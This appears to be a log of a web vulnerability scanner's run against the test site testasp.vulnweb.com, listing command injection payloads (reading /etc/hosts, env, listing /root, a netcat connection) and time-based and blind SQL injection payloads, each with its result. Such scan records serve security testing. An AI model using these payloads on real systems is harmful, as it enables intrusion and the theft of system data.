+URL: http://testasp.vulnweb.com/, Payload: | cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ls /var/log, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ls /var/log, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ls /var/log, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ls /var/log, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ls /var/log, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ls /var/log, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ls /var/log, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ls /var/log, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ls /var/log, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ls /var/log, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ls /var/log, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ls /var/log, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ls /var/log, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ls /var/log, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; nc -nv 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ls /var/log, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; nc -nv 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ls /var/log, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ls /var/log, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; nc -nv 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | nc -nv 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | nc -nv 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; nc -nv 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ls /var/log, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | nc -nv 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && nc -nv 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && nc -nv 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | nc -nv 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ls /var/log, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && nc -nv 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && nc -nv 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || nc -nv 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || nc -nv 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ls /var/log, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || nc -nv 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || nc -nv 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; nc -nv 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | nc -nv 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && nc -nv 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || nc -nv 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ls /var/log, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ls /var/log, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ls /var/log, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ls /var/log, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; nc -nv 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | nc -nv 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && nc -nv 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || nc -nv 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL:     <script>alert('XSS')</script>, Payload: ORDER BY 30, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ORDER BY 31337, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=', Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=', Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: %' AND 8310=8310 AND '%'=', Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: %' AND 8310=8311 AND '%'=', Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: and (select substring(@@version,1,1))='X', Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: and (select substring(@@version,1,1))='M', Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: and (select substring(@@version,2,1))='i', Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: and (select substring(@@version,2,1))='y', Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: and (select substring(@@version,3,1))='c', Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: and (select substring(@@version,3,1))='S', Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: and (select substring(@@version,3,1))='X', Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: sleep(5)#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: 1 or sleep(5)#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: " or sleep(5)#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ' or sleep(5)#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: " or sleep(5)=", Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ' or sleep(5)=', Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: 1) or sleep(5)#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ") or sleep(5)=", Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ') or sleep(5)=', Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: 1)) or sleep(5)#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ")) or sleep(5)=", Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ')) or sleep(5)=', Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ;waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: );waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ';waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ";waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ');waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ");waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ));waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: '));waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: "));waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: 1 or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: " or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ' or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: 1) or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ") or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ') or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: 1)) or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ")) or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ')) or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: pg_sleep(5)--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: 1 or pg_sleep(5)--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: " or pg_sleep(5)--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ' or pg_sleep(5)--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: 1) or pg_sleep(5)--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ") or pg_sleep(5)--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ') or pg_sleep(5)--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: 1)) or pg_sleep(5)--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ")) or pg_sleep(5)--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ')) or pg_sleep(5)--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'=', Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP), Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: SLEEP(5)#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: SLEEP(5)--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: SLEEP(5)=", Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: SLEEP(5)=', Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: or SLEEP(5), Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: or SLEEP(5)#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: or SLEEP(5)--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: or SLEEP(5)=", Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: or SLEEP(5)=', Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: waitfor delay '00:00:05', Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: waitfor delay '00:00:05'--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: waitfor delay '00:00:05'#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: benchmark(50000000,MD5(1)), Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: benchmark(50000000,MD5(1))--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: benchmark(50000000,MD5(1))#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: or benchmark(50000000,MD5(1)), Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: or benchmark(50000000,MD5(1))--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: or benchmark(50000000,MD5(1))#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: pg_SLEEP(5), Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: pg_SLEEP(5)--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: pg_SLEEP(5)#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: or pg_SLEEP(5), Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: or pg_SLEEP(5)--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: or pg_SLEEP(5)#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: '\", Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: AnD SLEEP(5), Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: AnD SLEEP(5)--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: AnD SLEEP(5)#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: &&SLEEP(5), Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: &&SLEEP(5)--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: &&SLEEP(5)#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ' AnD SLEEP(5) ANd '1, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: '&&SLEEP(5)&&'1, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ORDER BY SLEEP(5), Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ORDER BY SLEEP(5)--, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
+URL:     <script>alert('XSS')</script>, Payload: ORDER BY SLEEP(5)#, Type: SQL Injection, Indicator: Request Error, Vulnerable: Error
